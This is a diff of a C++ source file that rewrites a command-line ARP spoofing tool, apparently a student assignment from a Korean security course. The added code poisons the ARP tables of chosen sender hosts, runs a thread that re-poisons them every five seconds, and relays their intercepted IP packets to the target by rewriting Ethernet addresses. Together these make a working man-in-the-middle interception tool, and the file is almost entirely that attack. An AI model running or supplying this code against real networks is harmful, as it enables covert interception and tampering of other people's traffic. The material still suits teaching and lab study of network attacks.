@@ -1,40 +1,112 @@
-#include <stdio.h>
-#include "arp_spoof.h"
-
 /*
-[프로그램]
-arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]
-ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2
-
-[상세]
-
-오늘 배운 "ARP spoofing의 모든 것" PPT 숙지할 것.
-
-코드에 victim, gateway라는 용어를 사용하지 말고 반드시 sender, target(혹은 receiver)라는 단어를 사용할 것.
-
-sender에서 보내는 spoofed IP packet을 attacker가 수신하면 이를 relay하는 것 코드 구현.
-
-sender에서 infection이 풀리는 시점을 정확히 파악하여 재감염시키는 코드 구현.
-
-주기적으로 ARP injection packet을 날리는 코드 구현.
-
-코딩 능력이 된다면 (sender, target) 세션을 여러개 처리할 수 있도록 코드 구현.
-
+ *
+ * 대상 목록 관리
+ * broadcast인 request잡아서 반응
+ * 
 */
 
-int main(int argc, char * argv[])
-{
+#include "arp_spoof.h"
 
-    if(argc < 4)
+Attack::Attack(uint8_t * interface, uint32_t senderIP, uint32_t targetIP, PcapManager *pcapManager)
+{
+ 
+    sendArp = new SendARP(interface, senderIP, targetIP, pcapManager);
+
+}
+
+
+void ARPSpoof::AddAttackList(uint32_t senderIP, uint32_t targetIP)
+{
+    Attack * attack = new Attack(interface, senderIP, targetIP, pcapManager);
+    attackList.push_back(attack);
+
+}
+
+
+void ARPSpoof::AttackStart()
+{
+    list<Attack *>::iterator itor;
+
+    for (itor=attackList.begin(); itor != attackList.end(); itor++)
     {
-        printf("usage : arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
-        return 1;
+        SendARP * sa = (*itor)->sendArp;
+
+        sa->InfectARPTable();
+
+        //주기적으로 infect 하는 쓰레드 생성
+        thread maintain (&ARPSpoof::MaintainInfection, this, sa);
+        maintain.detach();
+
+        //relay 요청
+            //구독 신청 src->attacker -> target
+        Subscriber * sub = new Subscriber( sa->senderMAC, (uint8_t * ) sa->myMAC, 
+                                            0, sa->myIP, 
+                                            NULL, NULL,
+                                            0, 0,
+                                            (uint32_t)SUBTYPE::RELAYIP, 
+                                            (void *)this, 
+                                            ETHERTYPE_IP,
+                                            (void *)&ARPSpoof::RelayIPPacket
+                                            );
+        pcapManager->AddSubscriber(sub);
+        (*itor)->subID = sub->GetSubID();
+
+    }
+}
+
+void ARPSpoof::MaintainInfection(SendARP * sendARP)
+{
+    while(true)
+    {
+        this_thread::sleep_for(5s);
+        sendARP->InfectARPTable();
+    }
+    
+}
+
+//target mac을 변경하여 전송
+//sender -> attacker -> target
+void ARPSpoof::RelayIPPacket(const uint8_t * buf, uint32_t len, uint8_t subID)
+{
+    uint8_t * modifiedPacket;
+    modifiedPacket = (uint8_t *)malloc(len);
+
+    memcpy(modifiedPacket, buf, len);
+    
+    //패킷 수정
+    struct ether_header * eth = (struct ether_header * )modifiedPacket;
+
+    list<Attack *>::iterator itor;
+    for (itor=attackList.begin(); itor != attackList.end(); itor++)
+    {
+        if( (*itor)->subID  == subID)
+        {
+            //이더넷 헤더를 target MAC으로 변환
+            printf("send modified...\n");
+
+            memcpy( (eth->ether_shost), (*itor)->sendArp->myMAC, ETH_ALEN);
+            memcpy( (eth->ether_dhost), (*itor)->sendArp->targetMAC, ETH_ALEN);
+
+
+            pcapManager->Send(modifiedPacket, len);
+            break;
+        }
     }
 
 
+    free(modifiedPacket);
+
+}
 
 
-   
 
+
+ARPSpoof::ARPSpoof(uint8_t * inter, uint32_t num)
+{
+    attackNum = num;
+    interface = inter;
+    pcapManager = new PcapManager(interface);
+
+    //while(1);
 }
 
